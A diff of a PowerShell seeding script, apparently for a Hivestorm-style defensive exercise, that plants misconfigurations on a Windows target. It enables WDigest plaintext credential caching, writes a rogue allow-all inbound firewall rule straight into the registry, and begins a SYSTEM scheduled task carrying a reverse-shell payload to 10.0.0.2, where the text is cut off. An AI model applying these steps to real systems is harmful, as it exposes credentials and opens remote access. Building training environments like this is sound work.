@@ -33,13 +33,23 @@ if (-not (Test-Path $wdigest)) { New-Item -Path $wdigest -Force | Out-Null }
 Set-ItemProperty -Path $wdigest -Name UseLogonCredential -Value 1 -Type DWord
 
 # ---- rogue inbound firewall rule ---------------------------------------------
-# MpsSvc is absent from Server-Core containers; New-NetFirewallRule will throw
-# "no more endpoints available". The verify check will then see no rule (pass);
-# treat this as a known-degraded check on container targets.
+# MpsSvc / BFE are present but non-functional on Server-Core containers (the
+# RPC endpoint mapper needed by New-NetFirewallRule is unavailable). On real
+# Windows hosts, persistent firewall rules are stored as registry values under
+# FirewallPolicy\FirewallRules — which is exactly what netsh / NetFirewallRule
+# cmdlets write to on disk. Plant the rogue rule directly at that registry
+# path so the misconfig is genuinely present at seed time and the defender has
+# to actually delete it (either via Remove-NetFirewallRule on a live host, or
+# via registry cleanup — both channels resolve to the same storage).
+$fwRegPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules'
+if (-not (Test-Path $fwRegPath)) { New-Item -Path $fwRegPath -Force | Out-Null }
+$ruleValue = "v2.30|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=$fwPort|App=*|Name=$fwRule|Desc=Hivestorm rogue rule|"
+Set-ItemProperty -Path $fwRegPath -Name $fwRule -Value $ruleValue -Type String
+# Best-effort live plant so VM/real-host variants still see a NetFirewallRule.
 try {
     New-NetFirewallRule -DisplayName $fwRule -Direction Inbound -Protocol TCP `
-        -LocalPort $fwPort -Action Allow -Profile Any | Out-Null
-} catch { Write-Warning "firewall rule plant skipped: $_" }
+        -LocalPort $fwPort -Action Allow -Profile Any -ErrorAction Stop | Out-Null
+} catch {}
 
 # ---- scheduled task (SYSTEM) with encoded-command reverse shell ---------------
 $payload = "`$c=New-Object Net.Sockets.TCPClient('10.0.0.2',$fwPort);" +
